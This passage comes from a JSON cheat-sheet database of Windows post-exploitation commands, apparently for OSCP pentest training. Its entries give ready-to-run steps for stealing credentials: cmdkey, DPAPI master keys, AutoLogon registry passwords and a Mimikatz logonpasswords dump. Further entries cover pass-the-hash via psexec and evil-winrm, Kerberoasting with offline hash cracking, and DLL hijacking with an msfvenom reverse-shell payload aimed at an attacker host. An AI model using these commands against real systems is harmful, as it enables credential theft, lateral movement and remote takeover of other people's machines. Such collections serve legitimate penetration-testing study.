        "PRIVILEGE_ESCALATION",
        "QUICK_WIN",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "/list": "Display all stored credentials",
        "cmdkey": "Windows credential manager CLI"
      },
      "success_indicators": [
        "Domain credentials",
        "Generic credentials",
        "Administrator entries"
      ],
      "failure_indicators": [
        "Currently stored credentials: none",
        "Access denied"
      ],
      "next_steps": [
        "Run as stored user: runas /savecred /user:admin cmd",
        "Extract with Mimikatz: sekurlsa::credman",
        "Check RDP: mstsc /v:<server>",
        "PowerShell: $cred = Get-Credential; Start-Process cmd -Credential $cred"
      ],
      "alternatives": [
        "dir C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Credentials\\",
        "vaultcmd /listcreds:\"Windows Credentials\""
      ],
      "notes": "RunAs with /savecred is powerful",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-dpapi-masterkeys",
      "name": "DPAPI Master Keys",
      "category": "post-exploit",
      "command": "dir /a /s /b C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Protect\\",
      "description": "Find DPAPI master keys for credential decryption",
      "tags": [
        "CREDENTIAL_ACCESS",
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "/a": "All files including hidden",
        "/s": "Recursive search",
        "/b": "Bare format",
        "Protect": "DPAPI master keys location"
      },
      "success_indicators": [
        "S-1-5-21-* folders",
        "Master key GUIDs",
        "Preferred file present"
      ],
      "failure_indicators": [
        "No files found",
        "Access denied",
        "Empty folders"
      ],
      "next_steps": [
        "Extract with Mimikatz: dpapi::masterkey /in:<masterkey>",
        "Decrypt Chrome passwords: dpapi::chrome",
        "Decrypt RDP passwords: dpapi::rdg",
        "SharpDPAPI for automation"
      ],
      "alternatives": [
        "SharpDPAPI.exe masterkeys",
        "mimikatz dpapi::masterkey"
      ],
      "notes": "Requires user password or domain backup key",
      "oscp_relevance": "medium",
      "subcategory": "windows"
    },
    {
      "id": "windows-autologon",
      "name": "AutoLogon Credentials",
      "category": "post-exploit",
      "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" | findstr /i \"DefaultUserName DefaultDomainName DefaultPassword\"",
      "description": "Check registry for autologon credentials",
      "tags": [
        "CREDENTIAL_ACCESS",
        "DATABASE",
        "EXPLOITATION",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "QUICK_WIN",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "reg query": "Query registry values",
        "Winlogon": "Windows logon configuration",
        "findstr /i": "Case insensitive search"
      },
      "success_indicators": [
        "DefaultPassword value present",
        "DefaultUserName with admin",
        "Clear text password"
      ],
      "failure_indicators": [
        "No DefaultPassword",
        "Values not found",
        "Access denied"
      ],
      "next_steps": [
        "Use credentials: net use \\\\<IP> /user:<user> <password>",
        "RDP access: mstsc /v:<IP>",
        "PSExec: psexec.py <domain>/<user>:<pass>@<IP>",
        "Check for reuse on other systems"
      ],
      "alternatives": [
        "Get-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\"",
        "netpass.exe"
      ],
      "notes": "Common in kiosk/lab environments",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-pass-the-hash",
      "name": "Pass the Hash Attack",
      "category": "post-exploit",
      "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::logonpasswords\" \"exit\"",
      "description": "Extract NTLM hashes for pass-the-hash attacks",
      "tags": [
        "CREDENTIAL_ACCESS",
        "EXPLOITATION",
        "LATERAL_MOVEMENT",
        "MIMIKATZ",
        "OSCP:HIGH",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "privilege::debug": "Enable debug privilege",
        "sekurlsa::logonpasswords": "Dump logon passwords/hashes",
        "exit": "Exit after execution"
      },
      "success_indicators": [
        "NTLM hash extracted",
        "Authentication Id",
        "Administrator hash"
      ],
      "failure_indicators": [
        "ERROR kuhl_m_sekurlsa",
        "Access denied",
        "No credentials"
      ],
      "next_steps": [
        "PTH with psexec: psexec.py -hashes <LM>:<NTLM> administrator@<IP>",
        "Evil-WinRM: evil-winrm -i <IP> -u Administrator -H <hash>",
        "SMB access: smbclient //<IP>/C$ -U Administrator --pw-nt-hash <hash>",
        "Crack hash: hashcat -m 1000 hash.txt rockyou.txt"
      ],
      "alternatives": [
        "sekurlsa::pth /user:admin /ntlm:<hash> /domain:.",
        "Invoke-Mimikatz -DumpCreds"
      ],
      "notes": "Requires local admin or SYSTEM",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-kerberoasting",
      "name": "Kerberoasting Attack",
      "category": "post-exploit",
      "command": "setspn -T <DOMAIN> -Q */* | findstr /i service",
      "description": "Find service accounts for Kerberoasting",
      "tags": [
        "ACTIVE_DIRECTORY",
        "AD",
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:HIGH",
        "PERSISTENCE",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "WINDOWS"
      ],
      "variables": [
        {
          "name": "<DOMAIN>",
          "description": "Active Directory domain name",
          "example": "corp.local",
          "required": true
        }
      ],
      "flag_explanations": {
        "setspn": "Service Principal Name tool",
        "-T": "Target domain",
        "-Q": "Query SPNs",
        "*/*": "All SPNs"
      },
      "success_indicators": [
        "Service account SPNs",
        "SQL service accounts",
        "HTTP service accounts"
      ],
      "failure_indicators": [
        "No SPNs found",
        "Not domain joined",
        "Access denied"
      ],
      "next_steps": [
        "Request tickets: Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList '<SPN>'",
        "Export tickets: mimikatz kerberos::list /export",
        "Crack offline: hashcat -m 13100 ticket.kirbi wordlist.txt",
        "Use Rubeus: Rubeus.exe kerberoast"
      ],
      "alternatives": [
        "GetUserSPNs.py <domain>/<user>:<pass>",
        "Rubeus.exe kerberoast"
      ],
      "notes": "Service account passwords often weak",
      "oscp_relevance": "high",
      "subcategory": "windows"
    },
    {
      "id": "windows-dll-hijacking",
      "name": "DLL Hijacking Check",
      "category": "post-exploit",
      "command": "echo %PATH% & where /r C:\\ *.dll 2>nul | findstr /i /c:\"program files\"",
      "description": "Find potential DLL hijacking opportunities",
      "tags": [
        "DISCOVERY",
        "ENUMERATION",
        "EXPLOITATION",
        "OSCP:MEDIUM",
        "POST_EXPLOITATION",
        "PRIVESC",
        "PRIVILEGE_ESCALATION",
        "WINDOWS"
      ],
      "variables": [],
      "flag_explanations": {
        "%PATH%": "System PATH variable",
        "where /r": "Recursive file search",
        "*.dll": "Search for DLL files"
      },
      "success_indicators": [
        "Writable directories in PATH",
        "Missing DLLs in procmon",
        "DLL search order issues"
      ],
      "failure_indicators": [
        "No writable directories",
        "All DLLs present",
        "Secure PATH"
      ],
      "next_steps": [
        "Monitor with Procmon: NAME NOT FOUND for DLLs",
        "Create malicious DLL: msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> -f dll > hijack.dll",
        "Place in writable PATH directory",
        "Trigger vulnerable application"
      ],
      "alternatives": [
        "icacls C:\\Progra~1\\*",
        "dir /s /b C:\\*.dll 2>nul"
      ],
      "notes": "Common with third-party applications",
      "oscp_relevance": "medium",
      "subcategory": "windows"
    }
  ]
}